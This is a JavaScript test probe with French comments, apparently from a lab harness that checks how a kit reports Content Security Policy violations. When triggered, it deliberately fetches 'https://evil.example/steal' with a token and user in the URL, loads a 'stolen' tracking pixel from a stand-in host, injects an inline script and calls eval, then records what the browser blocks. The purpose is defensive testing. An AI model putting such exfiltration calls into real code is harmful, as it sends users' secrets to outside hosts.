// Sonde ZV du labo (contrats de GFS 5.4, point 14 ; cahier 3.2.2, S8) : une app qui démarre le relais du kit **en premier** (`violations-start.js`) puis, à la demande du labo (`window.trigger()`), tente trois
// choses que sa politique interdit : un appel `fetch` vers une adresse tierce (avec un chemin et des paramètres secrets : GFS ne doit en voir que l'hôte), une image tierce, un script écrit dans la page (que `script-src 'self'` refuse) et un `eval`. Elle écrit dans
// `document.body.dataset.sonde` ce que le NAVIGATEUR a levé dans son cadre (la mesure de contrôle : l'événement est bien levé ici, pas dans GFS).
import '../../../kit/js/violations-start.js';

const seen = { levees: [] };
const publish = () => { document.body.dataset.sonde = JSON.stringify(seen); };
document.addEventListener('securitypolicyviolation', event => { seen.levees.push({ directive: event.effectiveDirective, bloque: event.blockedURI }); publish(); });
publish();

window.trigger = async () => {
  try { await fetch('https://evil.example/steal?token=SECRET&user=ana#frag'); } catch (error) { seen.fetch = String(error && error.name); }
  new Image().src = 'https://img.evil.example/pixel.png?stolen=1';
  const inline = document.createElement('script');
  inline.textContent = 'window.__inline = 1';
  document.body.append(inline);
  try { (0, eval)('1 + 1'); } catch (error) { seen.eval = String(error && error.name); }
  await new Promise(resolve => setTimeout(resolve, 200));
  publish();
};
